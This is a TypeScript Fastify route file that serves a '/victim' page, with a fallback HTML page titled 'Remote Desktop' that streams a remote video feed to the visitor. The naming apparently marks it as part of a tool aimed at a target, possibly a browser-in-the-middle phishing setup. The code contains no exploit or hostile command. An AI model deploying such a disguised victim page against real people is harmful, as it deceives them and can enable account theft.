import type { FastifyInstance } from 'fastify';
import { readFileSync, existsSync } from 'fs';
import { join } from 'path';
import { logger } from '../../utils/logger.js';

/**
 * Setup victim page route
 */
export function setupVictimRoute(app: FastifyInstance): void {
  app.get('/victim', async (_request, reply) => {
    try {
      // Try to serve the built HTML file first
      const builtHtmlPath = join(process.cwd(), 'dist/client/victim/index.html');
      
      if (existsSync(builtHtmlPath)) {
        const html = readFileSync(builtHtmlPath, 'utf-8');
        // Update asset paths to use /client/ prefix
        const updatedHtml = html
          .replace(/href="\.\//g, 'href="/client/victim/')
          .replace(/src="\.\//g, 'src="/client/victim/')
          .replace(/href="\/assets\//g, 'href="/client/assets/')
          .replace(/src="\/assets\//g, 'src="/client/assets/');
        return reply.type('text/html').send(updatedHtml);
      }

      // Fallback: serve basic HTML (for development)
      const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Desktop</title>
    <link rel="stylesheet" href="/client/victim/styles.css">
</head>
<body>
    <div id="app">
        <div id="status-bar">
            <div id="status">Connecting...</div>
            <div id="connection-info"></div>
        </div>
        
        <div id="video-container">
            <video id="remote-video" autoplay playsinline></video>
            <div id="loading-overlay">
                <div class="spinner"></div>
                <p>Establishing connection...</p>
            </div>
            <div id="error-overlay" class="hidden">
                <p id="error-message"></p>
                <button id="retry-btn">Retry</button>
            </div>
        </div>
        
        <div id="controls" class="hidden">
            <button id="fullscreen-btn">Fullscreen</button>
        </div>
    </div>
    
    <script type="module" src="/client/victim/main.js"></script>
</body>
</html>
      `.trim();

      return reply.type('text/html').send(html);
    } catch (error) {
      logger.error('Error serving victim page:', error);
      return reply.code(500).send({ error: 'Failed to load victim page' });
    }
  });
}
